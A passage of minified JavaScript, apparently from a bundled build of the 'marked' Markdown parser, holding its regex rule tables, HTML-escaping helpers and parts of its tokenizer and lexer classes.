/i,endATag:/^<\/a>/i,startPreScriptTag:/^<(pre|code|kbd|script)(\s|>)/i,endPreScriptTag:/^<\/(pre|code|kbd|script)(\s|>)/i,startAngleBracket:/^</,endAngleBracket:/>$/,pedanticHrefTitle:/^([^'"]*[^\s])\s+(['"])(.*)\2/,unicodeAlphaNumeric:/[\p{L}\p{N}]/u,escapeTest:/[&<>"']/,escapeReplace:/[&<>"']/g,escapeTestNoEncode:/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/,escapeReplaceNoEncode:/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/g,unescapeTest:/&(#(?:\d+)|(?:#x[0-9A-Fa-f]+)|(?:\w+));?/ig,caret:/(^|[^\[])\^/g,percentDecode:/%25/g,findPipe:/\|/g,splitPipe:/ \|/,slashPipe:/\\\|/g,carriageReturn:/\r\n|\r/g,spaceLine:/^ +$/gm,notSpaceStart:/^\S*/,endingNewline:/\n$/,listItemRegex:e=>new RegExp(`^( {0,3}${e})((?:[	 ][^\\n]*)?(?:\\n|$))`),nextBulletRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}(?:[*+-]|\\d{1,9}[.)])((?:[ 	][^\\n]*)?(?:\\n|$))`),hrRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}((?:- *){3,}|(?:_ *){3,}|(?:\\* *){3,})(?:\\n+|$)`),fencesBeginRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}(?:\`\`\`|~~~)`),headingBeginRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}#`),htmlBeginRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}<(?:[a-z].*>|!--)`,"i")},Yp=/^(?:[ \t]*(?:\n|$))+/,Kp=/^((?: {4}| {0,3}\t)[^\n]+(?:\n(?:[ \t]*(?:\n|$))*)?)+/,Qp=/^ {0,3}(`{3,}(?=[^`\n]*(?:\n|$))|~{3,})([^\n]*)(?:\n|$)(?:|([\s\S]*?)(?:\n|$))(?: {0,3}\1[~`]* *(?=\n|$)|$)/,Ke=/^ {0,3}((?:-[\t ]*){3,}|(?:_[ \t]*){3,}|(?:\*[ \t]*){3,})(?:\n+|$)/,Zp=/^ {0,3}(#{1,6})(?=\s|$)(.*)(?:\n+|$)/,es=/(?:[*+-]|\d{1,9}[.)])/,ts=O(/^(?!bull |blockCode|fences|blockquote|heading|html)((?:.|\n(?!\s*?\n|bull |blockCode|fences|blockquote|heading|html))+?)\n {0,3}(=+|-+) *(?:\n+|$)/).replace(/bull/g,es).replace(/blockCode/g,/(?: {4}| {0,3}\t)/).replace(/fences/g,/ {0,3}(?:`{3,}|~{3,})/).replace(/blockquote/g,/ {0,3}>/).replace(/heading/g,/ {0,3}#{1,6}/).replace(/html/g,/ {0,3}<[^\n>]+>\n/).getRegex(),un=/^([^\n]+(?:\n(?!hr|heading|lheading|blockquote|fences|list|html|table| +\n)[^\n]+)*)/,el=/^[^\n]+/,hn=/(?!\s*\])(?:\\.|[^\[\]\\])+/,tl=O(/^ {0,3}\[(label)\]: *(?:\n[ \t]*)?([^<\s][^\s]*|<.*?>)(?:(?: +(?:\n[ \t]*)?| *\n[ \t]*)(title))? *(?:\n+|$)/).replace("label",hn).replace("title",/(?:"(?:\\"?|[^"\\])*"|'[^'\n]*(?:\n[^'\n]+)*\n?'|\([^()]*\))/).getRegex(),nl=O(/^( {0,3}bull)([ \t][^\n]+?)?(?:\n|$)/).replace(/bull/g,es).getRegex(),Ct="address|article|aside|base|basefont|blockquote|body|caption|center|col|colgroup|dd|details|dialog|dir|div|dl|dt|fieldset|figcaption|figure|footer|form|frame|frameset|h[1-6]|head|header|hr|html|iframe|legend|li|link|main|menu|menuitem|meta|nav|noframes|ol|optgroup|option|p|param|search|section|summary|table|tbody|td|tfoot|th|thead|title|tr|track|ul",gn=/<!--(?:-?>|[\s\S]*?(?:-->|$))/,al=O("^ {0,3}(?:<(script|pre|style|textarea)[\\s>][\\s\\S]*?(?:</\\1>[^\\n]*\\n+|$)|comment[^\\n]*(\\n+|$)|<\\?[\\s\\S]*?(?:\\?>\\n*|$)|<![A-Z][\\s\\S]*?(?:>\\n*|$)|<!\\[CDATA\\[[\\s\\S]*?(?:\\]\\]>\\n*|$)|</?(tag)(?: +|\\n|/?>)[\\s\\S]*?(?:(?:\\n[ 	]*)+\\n|$)|<(?!script|pre|style|textarea)([a-z][\\w-]*)(?:attribute)*? */?>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n[ 	]*)+\\n|$)|</(?!script|pre|style|textarea)[a-z][\\w-]*\\s*>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n[ 	]*)+\\n|$))","i").replace("comment",gn).replace("tag",Ct).replace("attribute",/ +[a-zA-Z:_][\w.:-]*(?: *= *"[^"\n]*"| *= *'[^'\n]*'| *= *[^\s"'=<>`]+)?/).getRegex(),ns=O(un).replace("hr",Ke).replace("heading"," {0,3}#{1,6}(?:\\s|$)").replace("|lheading","").replace("|table","").replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",Ct).getRegex(),sl=O(/^( {0,3}> ?(paragraph|[^\n]*)(?:\n|$))+/).replace("paragraph",ns).getRegex(),mn={blockquote:sl,code:Kp,def:tl,fences:Qp,heading:Zp,hr:Ke,html:al,lheading:ts,list:nl,newline:Yp,paragraph:ns,table:Je,text:el},Qn=O("^ *([^\\n ].*)\\n {0,3}((?:\\| *)?:?-+:? *(?:\\| *:?-+:? *)*(?:\\| *)?)(?:\\n((?:(?! *\\n|hr|heading|blockquote|code|fences|list|html).*(?:\\n|$))*)\\n*|$)").replace("hr",Ke).replace("heading"," {0,3}#{1,6}(?:\\s|$)").replace("blockquote"," {0,3}>").replace("code","(?: {4}| {0,3}	)[^\\n]").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",Ct).getRegex(),rl={...mn,table:Qn,paragraph:O(un).replace("hr",Ke).replace("heading"," {0,3}#{1,6}(?:\\s|$)").replace("|lheading","").replace("table",Qn).replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",Ct).getRegex()},ol={...mn,html:O(`^ *(?:comment *(?:\\n|\\s*$)|<(tag)[\\s\\S]+?</\\1> *(?:\\n{2,}|\\s*$)|<tag(?:"[^"]*"|'[^']*'|\\s[^'"/>\\s]*)*?/?> *(?:\\n{2,}|\\s*$))`).replace("comment",gn).replace(/tag/g,"(?!(?:a|em|strong|small|s|cite|q|dfn|abbr|data|time|code|var|samp|kbd|sub|sup|i|b|u|mark|ruby|rt|rp|bdi|bdo|span|br|wbr|ins|del|img)\\b)\\w+(?!:|[^\\w\\s@]*@)\\b").getRegex(),def:/^ *\[([^\]]+)\]: *<?([^\s>]+)>?(?: +(["(][^\n]+[")]))? *(?:\n+|$)/,heading:/^(#{1,6})(.*)(?:\n+|$)/,fences:Je,lheading:/^(.+?)\n {0,3}(=+|-+) *(?:\n+|$)/,paragraph:O(un).replace("hr",Ke).replace("heading",` *#{1,6} *[^
]`).replace("lheading",ts).replace("|table","").replace("blockquote"," {0,3}>").replace("|fences","").replace("|list","").replace("|html","").replace("|tag","").getRegex()},pl=/^\\([!"#$%&'()*+,\-./:;<=>?@\[\]\\^_`{|}~])/,ll=/^(`+)([^`]|[^`][\s\S]*?[^`])\1(?!`)/,as=/^( {2,}|\\)\n(?!\s*$)/,il=/^(`+|[^`])(?:(?= {2,}\n)|[\s\S]*?(?:(?=[\\<!\[`*_]|\b_|$)|[^ ](?= {2,}\n)))/,Pt=/[\p{P}\p{S}]/u,kn=/[\s\p{P}\p{S}]/u,ss=/[^\s\p{P}\p{S}]/u,cl=O(/^((?![*_])punctSpace)/,"u").replace(/punctSpace/g,kn).getRegex(),rs=/(?!~)[\p{P}\p{S}]/u,dl=/(?!~)[\s\p{P}\p{S}]/u,xl=/(?:[^\s\p{P}\p{S}]|~)/u,yl=/\[[^[\]]*?\]\((?:\\.|[^\\\(\)]|\((?:\\.|[^\\\(\)])*\))*\)|`[^`]*?`|<[^<>]*?>/g,os=/^(?:\*+(?:((?!\*)punct)|[^\s*]))|^_+(?:((?!_)punct)|([^\s_]))/,wl=O(os,"u").replace(/punct/g,Pt).getRegex(),fl=O(os,"u").replace(/punct/g,rs).getRegex(),ps="^[^_*]*?__[^_*]*?\\*[^_*]*?(?=__)|[^*]+(?=[^*])|(?!\\*)punct(\\*+)(?=[\\s]|$)|notPunctSpace(\\*+)(?!\\*)(?=punctSpace|$)|(?!\\*)punctSpace(\\*+)(?=notPunctSpace)|[\\s](\\*+)(?!\\*)(?=punct)|(?!\\*)punct(\\*+)(?!\\*)(?=punct)|notPunctSpace(\\*+)(?=notPunctSpace)",ul=O(ps,"gu").replace(/notPunctSpace/g,ss).replace(/punctSpace/g,kn).replace(/punct/g,Pt).getRegex(),hl=O(ps,"gu").replace(/notPunctSpace/g,xl).replace(/punctSpace/g,dl).replace(/punct/g,rs).getRegex(),gl=O("^[^_*]*?\\*\\*[^_*]*?_[^_*]*?(?=\\*\\*)|[^_]+(?=[^_])|(?!_)punct(_+)(?=[\\s]|$)|notPunctSpace(_+)(?!_)(?=punctSpace|$)|(?!_)punctSpace(_+)(?=notPunctSpace)|[\\s](_+)(?!_)(?=punct)|(?!_)punct(_+)(?!_)(?=punct)","gu").replace(/notPunctSpace/g,ss).replace(/punctSpace/g,kn).replace(/punct/g,Pt).getRegex(),ml=O(/\\(punct)/,"gu").replace(/punct/g,Pt).getRegex(),kl=O(/^<(scheme:[^\s\x00-\x1f<>]*|email)>/).replace("scheme",/[a-zA-Z][a-zA-Z0-9+.-]{1,31}/).replace("email",/[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+(@)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+(?![-_])/).getRegex(),Wl=O(gn).replace("(?:-->|$)","-->").getRegex(),Sl=O("^comment|^</[a-zA-Z][\\w:-]*\\s*>|^<[a-zA-Z][\\w-]*(?:attribute)*?\\s*/?>|^<\\?[\\s\\S]*?\\?>|^<![a-zA-Z]+\\s[\\s\\S]*?>|^<!\\[CDATA\\[[\\s\\S]*?\\]\\]>").replace("comment",Wl).replace("attribute",/\s+[a-zA-Z:_][\w.:-]*(?:\s*=\s*"[^"]*"|\s*=\s*'[^']*'|\s*=\s*[^\s"'=<>`]+)?/).getRegex(),ut=/(?:\[(?:\\.|[^\[\]\\])*\]|\\.|`[^`]*`|[^\[\]\\`])*?/,bl=O(/^!?\[(label)\]\(\s*(href)(?:\s+(title))?\s*\)/).replace("label",ut).replace("href",/<(?:\\.|[^\n<>\\])+>|[^\s\x00-\x1f]*/).replace("title",/"(?:\\"?|[^"\\])*"|'(?:\\'?|[^'\\])*'|\((?:\\\)?|[^)\\])*\)/).getRegex(),ls=O(/^!?\[(label)\]\[(ref)\]/).replace("label",ut).replace("ref",hn).getRegex(),is=O(/^!?\[(ref)\](?:\[\])?/).replace("ref",hn).getRegex(),Tl=O("reflink|nolink(?!\\()","g").replace("reflink",ls).replace("nolink",is).getRegex(),Wn={_backpedal:Je,anyPunctuation:ml,autolink:kl,blockSkip:yl,br:as,code:ll,del:Je,emStrongLDelim:wl,emStrongRDelimAst:ul,emStrongRDelimUnd:gl,escape:pl,link:bl,nolink:is,punctuation:cl,reflink:ls,reflinkSearch:Tl,tag:Sl,text:il,url:Je},Cl={...Wn,link:O(/^!?\[(label)\]\((.*?)\)/).replace("label",ut).getRegex(),reflink:O(/^!?\[(label)\]\s*\[([^\]]*)\]/).replace("label",ut).getRegex()},Yt={...Wn,emStrongRDelimAst:hl,emStrongLDelim:fl,url:O(/^((?:ftp|https?):\/\/|www\.)(?:[a-zA-Z0-9\-]+\.?)+[^\s<]*|^email/,"i").replace("email",/[A-Za-z0-9._+-]+(@)[a-zA-Z0-9-_]+(?:\.[a-zA-Z0-9-_]*[a-zA-Z0-9])+(?![-_])/).getRegex(),_backpedal:/(?:[^?!.,:;*_'"~()&]+|\([^)]*\)|&(?![a-zA-Z0-9]+;$)|[?!.,:;*_'"~)]+(?!$))+/,del:/^(~~?)(?=[^\s~])((?:\\.|[^\\])*?(?:\\.|[^\s~\\]))\1(?=[^~]|$)/,text:/^([`~]+|[^`~])(?:(?= {2,}\n)|(?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)|[\s\S]*?(?:(?=[\\<!\[`*~_]|\b_|https?:\/\/|ftp:\/\/|www\.|$)|[^ ](?= {2,}\n)|[^a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-](?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)))/},Pl={...Yt,br:O(as).replace("{2,}","*").getRegex(),text:O(Yt.text).replace("\\b_","\\b_| {2,}\\n").replace(/\{2,\}/g,"*").getRegex()},st={normal:mn,gfm:rl,pedantic:ol},Ie={normal:Wn,gfm:Yt,breaks:Pl,pedantic:Cl},vl={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"},Zn=e=>vl[e];function pe(e,t){if(t){if($.escapeTest.test(e))return e.replace($.escapeReplace,Zn)}else if($.escapeTestNoEncode.test(e))return e.replace($.escapeReplaceNoEncode,Zn);return e}function ea(e){try{e=encodeURI(e).replace($.percentDecode,"%")}catch{return null}return e}function ta(e,t){var r;const n=e.replace($.findPipe,(o,p,l)=>{let i=!1,d=p;for(;--d>=0&&l[d]==="\\";)i=!i;return i?"|":" |"}),a=n.split($.splitPipe);let s=0;if(a[0].trim()||a.shift(),a.length>0&&!((r=a.at(-1))!=null&&r.trim())&&a.pop(),t)if(a.length>t)a.splice(t);else for(;a.length<t;)a.push("");for(;s<a.length;s++)a[s]=a[s].trim().replace($.slashPipe,"|");return a}function je(e,t,n){const a=e.length;if(a===0)return"";let s=0;for(;s<a&&e.charAt(a-s-1)===t;)s++;return e.slice(0,a-s)}function Rl(e,t){if(e.indexOf(t[1])===-1)return-1;let n=0;for(let a=0;a<e.length;a++)if(e[a]==="\\")a++;else if(e[a]===t[0])n++;else if(e[a]===t[1]&&(n--,n<0))return a;return-1}function na(e,t,n,a,s){const r=t.href,o=t.title||null,p=e[1].replace(s.other.outputLinkReplace,"$1");if(e[0].charAt(0)!=="!"){a.state.inLink=!0;const l={type:"link",raw:n,href:r,title:o,text:p,tokens:a.inlineTokens(p)};return a.state.inLink=!1,l}return{type:"image",raw:n,href:r,title:o,text:p}}function El(e,t,n){const a=e.match(n.other.indentCodeCompensation);if(a===null)return t;const s=a[1];return t.split(`
`).map(r=>{const o=r.match(n.other.beginningSpace);if(o===null)return r;const[p]=o;return p.length>=s.length?r.slice(s.length):r}).join(`
`)}class ht{constructor(t){A(this,"options");A(this,"rules");A(this,"lexer");this.options=t||be}space(t){const n=this.rules.block.newline.exec(t);if(n&&n[0].length>0)return{type:"space",raw:n[0]}}code(t){const n=this.rules.block.code.exec(t);if(n){const a=n[0].replace(this.rules.other.codeRemoveIndent,"");return{type:"code",raw:n[0],codeBlockStyle:"indented",text:this.options.pedantic?a:je(a,`
`)}}}fences(t){const n=this.rules.block.fences.exec(t);if(n){const a=n[0],s=El(a,n[3]||"",this.rules);return{type:"code",raw:a,lang:n[2]?n[2].trim().replace(this.rules.inline.anyPunctuation,"$1"):n[2],text:s}}}heading(t){const n=this.rules.block.heading.exec(t);if(n){let a=n[2].trim();if(this.rules.other.endingHash.test(a)){const s=je(a,"#");(this.options.pedantic||!s||this.rules.other.endingSpaceChar.test(s))&&(a=s.trim())}return{type:"heading",raw:n[0],depth:n[1].length,text:a,tokens:this.lexer.inline(a)}}}hr(t){const n=this.rules.block.hr.exec(t);if(n)return{type:"hr",raw:je(n[0],`
`)}}blockquote(t){const n=this.rules.block.blockquote.exec(t);if(n){let a=je(n[0],`
`).split(`
`),s="",r="";const o=[];for(;a.length>0;){let p=!1;const l=[];let i;for(i=0;i<a.length;i++)if(this.rules.other.blockquoteStart.test(a[i]))l.push(a[i]),p=!0;else if(!p)l.push(a[i]);else break;a=a.slice(i);const d=l.join(`
`),f=d.replace(this.rules.other.blockquoteSetextReplace,`
    $1`).replace(this.rules.other.blockquoteSetextReplace2,"");s=s?`${s}
${d}`:d,r=r?`${r}
${f}`:f;const y=this.lexer.state.top;if(this.lexer.state.top=!0,this.lexer.blockTokens(f,o,!0),this.lexer.state.top=y,a.length===0)break;const h=o.at(-1);if((h==null?void 0:h.type)==="code")break;if((h==null?void 0:h.type)==="blockquote"){const m=h,b=m.raw+`
`+a.join(`
`),j=this.blockquote(b);o[o.length-1]=j,s=s.substring(0,s.length-m.raw.length)+j.raw,r=r.substring(0,r.length-m.text.length)+j.text;break}else if((h==null?void 0:h.type)==="list"){const m=h,b=m.raw+`
`+a.join(`
`),j=this.list(b);o[o.length-1]=j,s=s.substring(0,s.length-h.raw.length)+j.raw,r=r.substring(0,r.length-m.raw.length)+j.raw,a=b.substring(o.at(-1).raw.length).split(`
`);continue}}return{type:"blockquote",raw:s,tokens:o,text:r}}}list(t){let n=this.rules.block.list.exec(t);if(n){let a=n[1].trim();const s=a.length>1,r={type:"list",raw:"",ordered:s,start:s?+a.slice(0,-1):"",loose:!1,items:[]};a=s?`\\d{1,9}\\${a.slice(-1)}`:`\\${a}`,this.options.pedantic&&(a=s?a:"[*+-]");const o=this.rules.other.listItemRegex(a);let p=!1;for(;t;){let i=!1,d="",f="";if(!(n=o.exec(t))||this.rules.block.hr.test(t))break;d=n[0],t=t.substring(d.length);let y=n[2].split(`
`,1)[0].replace(this.rules.other.listReplaceTabs,Y=>" ".repeat(3*Y.length)),h=t.split(`
`,1)[0],m=!y.trim(),b=0;if(this.options.pedantic?(b=2,f=y.trimStart()):m?b=n[1].length+1:(b=n[2].search(this.rules.other.nonSpaceChar),b=b>4?1:b,f=y.slice(b),b+=n[1].length),m&&this.rules.other.blankLine.test(h)&&(d+=h+`
`,t=t.substring(h.length+1),i=!0),!i){const Y=this.rules.other.nextBulletRegex(b),se=this.rules.other.hrRegex(b),K=this.rules.other.fencesBeginRegex(b),Q=this.rules.other.headingBeginRegex(b),B=this.rules.other.htmlBeginRegex(b);for(;t;){const we=t.split(`
`,1)[0];let F;if(h=we,this.options.pedantic?(h=h.replace(this.rules.other.listReplaceNesting,"  "),F=h):F=h.replace(this.rules.other.tabCharGlobal,"    "),K.test(h)||Q.test(h)||B.test(h)||Y.test(h)||se.test(h))break;if(F.search(this.rules.other.nonSpaceChar)>=b||!h.trim())f+=`
`+F.slice(b);else{if(m||y.replace(this.rules.other.tabCharGlobal,"    ").search(this.rules.other.nonSpaceChar)>=4||K.test(y)||Q.test(y)||se.test(y))break;f+=`
`+h}!m&&!h.trim()&&(m=!0),d+=we+`
`,t=t.substring(we.length+1),y=F.slice(b)}}r.loose||(p?r.loose=!0:this.rules.other.doubleBlankLine.test(d)&&(p=!0));let j=null,le;this.options.gfm&&(j=this.rules.other.listIsTask.exec(f),j&&(le=j[0]!=="[ ] ",f=f.replace(this.rules.other.listReplaceTask,""))),r.items.push({type:"list_item",raw:d,task:!!j,checked:le,loose:!1,text:f,tokens:[]}),r.raw+=d}const l=r.items.at(-1);if(l)l.raw=l.raw.trimEnd(),l.text=l.text.trimEnd();else return;r.raw=r.raw.trimEnd();for(let i=0;i<r.items.length;i++)if(this.lexer.state.top=!1,r.items[i].tokens=this.lexer.blockTokens(r.items[i].text,[]),!r.loose){const d=r.items[i].tokens.filter(y=>y.type==="space"),f=d.length>0&&d.some(y=>this.rules.other.anyLine.test(y.raw));r.loose=f}if(r.loose)for(let i=0;i<r.items.length;i++)r.items[i].loose=!0;return r}}html(t){const n=this.rules.block.html.exec(t);if(n)return{type:"html",block:!0,raw:n[0],pre:n[1]==="pre"||n[1]==="script"||n[1]==="style",text:n[0]}}def(t){const n=this.rules.block.def.exec(t);if(n){const a=n[1].toLowerCase().replace(this.rules.other.multipleSpaceGlobal," "),s=n[2]?n[2].replace(this.rules.other.hrefBrackets,"$1").replace(this.rules.inline.anyPunctuation,"$1"):"",r=n[3]?n[3].substring(1,n[3].length-1).replace(this.rules.inline.anyPunctuation,"$1"):n[3];return{type:"def",tag:a,raw:n[0],href:s,title:r}}}table(t){var p;const n=this.rules.block.table.exec(t);if(!n||!this.rules.other.tableDelimiter.test(n[2]))return;const a=ta(n[1]),s=n[2].replace(this.rules.other.tableAlignChars,"").split("|"),r=(p=n[3])!=null&&p.trim()?n[3].replace(this.rules.other.tableRowBlankLine,"").split(`
`):[],o={type:"table",raw:n[0],header:[],align:[],rows:[]};if(a.length===s.length){for(const l of s)this.rules.other.tableAlignRight.test(l)?o.align.push("right"):this.rules.other.tableAlignCenter.test(l)?o.align.push("center"):this.rules.other.tableAlignLeft.test(l)?o.align.push("left"):o.align.push(null);for(let l=0;l<a.length;l++)o.header.push({text:a[l],tokens:this.lexer.inline(a[l]),header:!0,align:o.align[l]});for(const l of r)o.rows.push(ta(l,o.header.length).map((i,d)=>({text:i,tokens:this.lexer.inline(i),header:!1,align:o.align[d]})));return o}}lheading(t){const n=this.rules.block.lheading.exec(t);if(n)return{type:"heading",raw:n[0],depth:n[2].charAt(0)==="="?1:2,text:n[1],tokens:this.lexer.inline(n[1])}}paragraph(t){const n=this.rules.block.paragraph.exec(t);if(n){const a=n[1].charAt(n[1].length-1)===`
`?n[1].slice(0,-1):n[1];return{type:"paragraph",raw:n[0],text:a,tokens:this.lexer.inline(a)}}}text(t){const n=this.rules.block.text.exec(t);if(n)return{type:"text",raw:n[0],text:n[0],tokens:this.lexer.inline(n[0])}}escape(t){const n=this.rules.inline.escape.exec(t);if(n)return{type:"escape",raw:n[0],text:n[1]}}tag(t){const n=this.rules.inline.tag.exec(t);if(n)return!this.lexer.state.inLink&&this.rules.other.startATag.test(n[0])?this.lexer.state.inLink=!0:this.lexer.state.inLink&&this.rules.other.endATag.test(n[0])&&(this.lexer.state.inLink=!1),!this.lexer.state.inRawBlock&&this.rules.other.startPreScriptTag.test(n[0])?this.lexer.state.inRawBlock=!0:this.lexer.state.inRawBlock&&this.rules.other.endPreScriptTag.test(n[0])&&(this.lexer.state.inRawBlock=!1),{type:"html",raw:n[0],inLink:this.lexer.state.inLink,inRawBlock:this.lexer.state.inRawBlock,block:!1,text:n[0]}}link(t){const n=this.rules.inline.link.exec(t);if(n){const a=n[2].trim();if(!this.options.pedantic&&this.rules.other.startAngleBracket.test(a)){if(!this.rules.other.endAngleBracket.test(a))return;const o=je(a.slice(0,-1),"\\");if((a.length-o.length)%2===0)return}else{const o=Rl(n[2],"()");if(o>-1){const l=(n[0].indexOf("!")===0?5:4)+n[1].length+o;n[2]=n[2].substring(0,o),n[0]=n[0].substring(0,l).trim(),n[3]=""}}let s=n[2],r="";if(this.options.pedantic){const o=this.rules.other.pedanticHrefTitle.exec(s);o&&(s=o[1],r=o[3])}else r=n[3]?n[3].slice(1,-1):"";return s=s.trim(),this.rules.other.startAngleBracket.test(s)&&(this.options.pedantic&&!this.rules.other.endAngleBracket.test(a)?s=s.slice(1):s=s.slice(1,-1)),na(n,{href:s&&s.replace(this.rules.inline.anyPunctuation,"$1"),title:r&&r.replace(this.rules.inline.anyPunctuation,"$1")},n[0],this.lexer,this.rules)}}reflink(t,n){let a;if((a=this.rules.inline.reflink.exec(t))||(a=this.rules.inline.nolink.exec(t))){const s=(a[2]||a[1]).replace(this.rules.other.multipleSpaceGlobal," "),r=n[s.toLowerCase()];if(!r){const o=a[0].charAt(0);return{type:"text",raw:o,text:o}}return na(a,r,a[0],this.lexer,this.rules)}}emStrong(t,n,a=""){let s=this.rules.inline.emStrongLDelim.exec(t);if(!s||s[3]&&a.match(this.rules.other.unicodeAlphaNumeric))return;if(!(s[1]||s[2]||"")||!a||this.rules.inline.punctuation.exec(a)){const o=[...s[0]].length-1;let p,l,i=o,d=0;const f=s[0][0]==="*"?this.rules.inline.emStrongRDelimAst:this.rules.inline.emStrongRDelimUnd;for(f.lastIndex=0,n=n.slice(-1*t.length+o);(s=f.exec(n))!=null;){if(p=s[1]||s[2]||s[3]||s[4]||s[5]||s[6],!p)continue;if(l=[...p].length,s[3]||s[4]){i+=l;continue}else if((s[5]||s[6])&&o%3&&!((o+l)%3)){d+=l;continue}if(i-=l,i>0)continue;l=Math.min(l,l+i+d);const y=[...s[0]][0].length,h=t.slice(0,o+s.index+y+l);if(Math.min(o,l)%2){const b=h.slice(1,-1);return{type:"em",raw:h,text:b,tokens:this.lexer.inlineTokens(b)}}const m=h.slice(2,-2);return{type:"strong",raw:h,text:m,tokens:this.lexer.inlineTokens(m)}}}}codespan(t){const n=this.rules.inline.code.exec(t);if(n){let a=n[2].replace(this.rules.other.newLineCharGlobal," ");const s=this.rules.other.nonSpaceChar.test(a),r=this.rules.other.startingSpaceChar.test(a)&&this.rules.other.endingSpaceChar.test(a);return s&&r&&(a=a.substring(1,a.length-1)),{type:"codespan",raw:n[0],text:a}}}br(t){const n=this.rules.inline.br.exec(t);if(n)return{type:"br",raw:n[0]}}del(t){const n=this.rules.inline.del.exec(t);if(n)return{type:"del",raw:n[0],text:n[2],tokens:this.lexer.inlineTokens(n[2])}}autolink(t){const n=this.rules.inline.autolink.exec(t);if(n){let a,s;return n[2]==="@"?(a=n[1],s="mailto:"+a):(a=n[1],s=a),{type:"link",raw:n[0],text:a,href:s,tokens:[{type:"text",raw:a,text:a}]}}}url(t){var a;let n;if(n=this.rules.inline.url.exec(t)){let s,r;if(n[2]==="@")s=n[0],r="mailto:"+s;else{let o;do o=n[0],n[0]=((a=this.rules.inline._backpedal.exec(n[0]))==null?void 0:a[0])??"";while(o!==n[0]);s=n[0],n[1]==="www."?r="http://"+n[0]:r=n[0]}return{type:"link",raw:n[0],text:s,href:r,tokens:[{type:"text",raw:s,text:s}]}}}inlineText(t){const n=this.rules.inline.text.exec(t);if(n){const a=this.lexer.state.inRawBlock;return{type:"text",raw:n[0],text:n[0],escaped:a}}}}class ne{constructor(t){A(this,"tokens");A(this,"options");A(this,"state");A(this,"tokenizer");A(this,"inlineQueue");this.tokens=[],this.tokens.links=Object.create(null),this.options=t||be,this.options.tokenizer=this.options.tokenizer||new ht,this.tokenizer=this.options.tokenizer,this.tokenizer.options=this.options,this.tokenizer.lexer=this,this.inlineQueue=[],this.state={inLink:!1,inRawBlock:!1,top:!0};const n={other:$,block:st.normal,inline:Ie.normal};this.options.pedantic?(n.block=st.pedantic,n.inline=Ie.pedantic):this.options.gfm&&(n.block=st.gfm,this.options.breaks?n.inline=Ie.breaks:n.inline=Ie.gfm),this.tokenizer.rules=n}static get rules(){return{block:st,inline:Ie}}static lex(t,n){return new ne(n).lex(t)}static lexInline(t,n){return new ne(n).inlineTokens(t)}lex(t){t=t.replace($.carriageReturn,`
`),this.blockTokens(t,this.tokens);for(let n=0;n<this.inlineQueue.length;n++){const a=this.inlineQueue[n];this.inlineTokens(a.src,a.tokens)}return this.inlineQueue=[],this.tokens}blockTokens(t,n=[],a=!1){var s,r,o;for(this.options.pedantic&&(t=t.replace($.tabCharGlobal,"    ").replace($.spaceLine,""));t;){let p;if((r=(s=this.options.extensions)==null?void 0:s.block)!=null&&r.some(i=>(p=i.call({lexer:this},t,n))?(t=t.substring(p.raw.length),n.push(p),!0):!1))continue;if(p=this.tokenizer.space(t)){t=t.substring(p.raw.length);const i=n.at(-1);p.raw.length===1&&i!==void 0?i.raw+=`
`:n.push(p);continue}if(p=this.tokenizer.code(t)){t=t.substring(p.raw.length);const i=n.at(-1);(i==null?void 0:i.type)==="paragraph"||(i==null?void 0:i.type)==="text"?(i.raw+=`
`+p.raw,i.text+=`
`+p.text,this.inlineQueue.at(-1).src=i.text):n.push(p);continue}if(p=this.tokenizer.fences(t)){t=t.substring(p.raw.length),n.push(p);continue}if(p=this.tokenizer.heading(t)){t=t.substring(p.raw.length),n.push(p);continue}if(p=this.tokenizer.hr(t)){t=t.substring(p.raw.length),n.push(p);continue}if(p=this.tokenizer.blockquote(t)){t=t.substring(p.raw.length),n.push(p);continue}if(p=this.tokenizer.list(t)){t=t.substring(p.raw.length),n.push(p);continue}if(p=this.tokenizer.html(t)){t=t.substring(p.raw.length),n.push(p);continue}if(p=this.tokenizer.def(t)){t=t.substring(p.raw.length);const i=n.at(-1);(i==null?void 0:i.type)==="paragraph"||(i==null?void 0:i.type)==="text"?(i.raw+=`
`+p.raw,i.text+=`
